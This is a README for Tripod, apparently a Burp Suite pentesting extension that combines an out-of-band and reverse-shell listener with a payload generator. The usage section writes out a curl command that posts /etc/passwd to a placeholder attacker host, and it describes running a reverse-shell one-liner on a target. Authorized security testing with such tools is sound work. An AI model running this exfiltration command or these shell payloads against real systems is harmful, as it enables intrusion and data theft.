# Tripod for Burp Suite

A powerful Burp Suite extension that combines a versatile network listener with a comprehensive payload generator, designed to streamline out-of-band and reverse shell testing.

Tripod integrates two essential pentesting tools directly into your Burp Suite workflow: a listener that can catch both simple HTTP requests and interactive reverse shells, and a payload generator with a rich library of templates for various systems and scenarios.

## Table of Contents

- [Core Features](#core-features)
  - [Tripod Listener](#tripod-listener)
  - [Payload Generator](#payload-generator)
- [Dependencies](#dependencies)
- [Installation](#installation)
  - [Using Precompiled JAR](#using-precompiled-jar)
  - [Building from Source with Ant](#building-from-source-with-ant)
- [Usage](#usage)
  - [Example 1: Catching an HTTP Callback (OAST)](#example-1-catching-an-http-callback-oast)
  - [Example 2: Getting a Reverse Shell](#example-2-getting-a-reverse-shell)
- [Author](#author)

## Core Features

### Tripod Listener

The listener is the core of the tool and operates in two distinct modes:

- **HTTP Webhook Mode**: Acts as a simple web server that logs all incoming HTTP requests. Ideal for out-of-band application security testing (OAST), such as verifying vulnerabilities like blind SSRF, blind SQLi, or blind command injection by forcing a target to make an HTTP request to a server you control.
- **Reverse Shell Mode**: Turns the listener into a handler for reverse shells. Once a target machine executes a reverse shell payload, it connects back to Tripod, providing an interactive command-line shell directly within the Burp Suite UI. Includes a command input field and a display for shell output.
- **Utility - Kill Used Ports**: A utility that lists all processes currently listening on TCP ports and allows you to select and terminate them, useful for freeing up ports that a previous process didn't release.

### Payload Generator

The second major feature is a comprehensive payload generator that helps create one-liners and scripts to trigger the listener.

- **Categorized Payloads**: Organized into logical groups: Reverse/Bind Shell, Web Shell, and Data Exfiltration.
- **Highly Customizable**: Tailor payloads by specifying the target Operating System (Linux/macOS or Windows), IP address, and Port. For reverse shells, choose from encoding methods like Base64 or URL encoding.
- **Rich Template Library**: Includes templates for common languages and tools, such as Python, Bash, PowerShell, Netcat, Perl, PHP, and Ruby.
- **Auto-Fill Integration**: An "Auto-fill from Listener" button populates the payload generator's IP and port fields with details from the active listener, streamlining the workflow.

## Dependencies

To compile and run this Burp Suite extension, you need:

- **Burp Suite API**: Provided by PortSwigger when downloading Burp Suite, required for extension development.
- **Third-Party Libraries**:
  - `jackson-core-2.12.7.jar`
  - `jackson-annotations-2.12.7.jar`
  - `jackson-databind-2.12.7.1.jar` (for advanced JSON processing)
  - `jjwt-api-0.12.5.jar` & `jjwt-impl-0.12.5.jar` (for JSON Web Tokens, likely for planned features)
  - `gson.jar` (for JSON processing, redundant with Jackson)
  - `flexmark-all-0.64.8.jar` (for Markdown processing, unlikely needed for core functionality)

## Installation

### Using Precompiled JAR

1. **Download the required JAR files**:
   - `Tripod.jar` (the compiled extension)
   - All dependency JARs listed above (place them in a single folder, e.g., `lib/`).

2. **Add the Extension to Burp Suite**:
   - Open Burp Suite (Professional or Community Edition) and go to the `Extender` -> `Extensions` tab.
   - Click `Add`.
   - Set `Extension type` to `Java`.
   - Click `Select file...` and choose `Tripod.jar`.
   - In the `Java Environment` section, click `Select folder...` and choose the folder containing all dependency JARs (e.g., `lib/`).
   - Click `Next`. The Tripod tab should appear in Burp Suite’s UI.
   - Verify the extension loads by checking the `Output` tab in Extender for the message `Tripod loaded successfully!`.

### Building from Source with Ant

To build the Tripod extension from scratch using Apache Ant, follow these steps:

1. **Prerequisites**:
   - **Java Development Kit (JDK)**: Version 8 or higher. Set the `JAVA_HOME` environment variable to your JDK installation (e.g., `JAVA_HOME=/path/to/jdk-11`).
   - **Apache Ant**: Version 1.10.x or higher. Add Ant’s `bin` directory to your `PATH` (e.g., `export PATH=/path/to/apache-ant-1.10.12/bin:$PATH`).
   - **Burp Suite API**: Obtain `burp.jar` from PortSwigger (included with Burp Suite) and place it in the `lib/` directory.
   - **Dependency JARs**: Download and place the following in the `lib/` directory:
     - `jackson-core-2.12.7.jar`
     - `jackson-annotations-2.12.7.jar`
     - `jackson-databind-2.12.7.1.jar`
     - `jjwt-api-0.12.5.jar`
     - `jjwt-impl-0.12.5.jar`
     - `gson.jar`
     - `flexmark-all-0.64.8.jar`
   - Download from [Maven Central](https://mvnrepository.com/) or other repositories.

2. **Set Up Project Directory**:
   - Create a project directory (e.g., `Tripod/`) with the following structure:
     ```
     Tripod/
     ├── BurpExtender.java
     └── TripodPanel.java
     ├── lib/
     │   ├── burp.jar
     │   ├── jackson-core-2.12.7.jar
     │   ├── jackson-annotations-2.12.7.jar
     │   ├── jackson-databind-2.12.7.1.jar
     │   ├── jjwt-api-0.12.5.jar
     │   ├── jjwt-impl-0.12.5.jar
     │   ├── gson.jar
     │   └── flexmark-all-0.64.8.jar
     ├── build.xml
     ├── build/
     │   └── (output directory for compiled classes)
     └── dist/
         └── (output directory for the final JAR)
     ```

3. **Run Ant Build**:
   - Navigate to the `Tripod` directory:
     ```bash
     cd /path/to/Tripod
     ```
   - Run the Ant build command:
     ```bash
     ant
     ```
   - This executes the default `dist` target in `build.xml`, which:
     - Compiles source files from `src/` into `build/`.
     - Packages compiled classes and dependencies into `dist/Tripod.jar` as a fat JAR.
     - Outputs: `Fat JAR file created successfully! Location: dist/Tripod.jar`.

4. **Verify and Install**:
   - Check the `dist/` directory for `Tripod.jar`.
   - Follow the steps in [Using Precompiled JAR](#using-precompiled-jar) to load `Tripod.jar` in Burp Suite.
   - If errors occur, check the Ant output or Burp’s `Extender` -> `Errors` tab. Ensure all dependency JARs are in `lib/` and correctly referenced.

5. **Troubleshooting**:
   - **Ant Not Found**: Verify Ant is installed and in your `PATH` (`ant -version`).
   - **Missing Dependencies**: Ensure all JARs are in `lib/`.
   - **API Version Mismatch**: Confirm `burp.jar` matches your Burp Suite version (e.g., 2023.10).
   - **Permission Issues**: Ensure write permissions for `build/` and `dist/`.
   - **Commented-Out Features**: The `Send to Tripod` context menu and settings persistence are disabled in the source code. Implement `saveSettings()`, `loadSettings()`, and `addEntry()` in `TripodPanel.java` to enable them.

## Usage

### Example 1: Catching an HTTP Callback (OAST)

1. Go to the **Tripod** -> **Listener** tab.
2. Select **HTTP Webhook** mode.
3. Enter a port (e.g., `8080`) and click **Start Listener**.
4. Go to the **Payload Generator** tab.
5. Select the `Data Exfiltration` category and the `Curl (File Upload)` template.
6. Click **Auto-fill from Listener** to set the correct IP and port.
7. Click **Generate** to create a payload like `curl -X POST --data-binary @/etc/passwd http://<YOUR_IP>:8080/`.
8. Execute the payload on the target machine.
9. The incoming request will appear in the **Request History** table on the Listener tab. Click it to view the full request and exfiltrated file content.

### Example 2: Getting a Reverse Shell

1. Go to the **Tripod** -> **Listener** tab.
2. Select **Reverse Shell** mode.
3. Enter a port (e.g., `4444`) and click **Start Listener**. The shell pane will show "Waiting for reverse shell connection...".
4. Go to the **Payload Generator** tab.
5. Select the `Reverse/Bind Shell` category, target OS (e.g., `Linux/macOS`), and a template (e.g., `Bash TCP`).
6. Click **Auto-fill from Listener**.
7. Click **Generate** to get the one-liner payload.
8. Execute the payload on the target machine.
9. Switch to the **Listener** tab. A "Connected" message will appear, and an interactive shell prompt will be ready for commands.

## Author

- **Joel Indra**
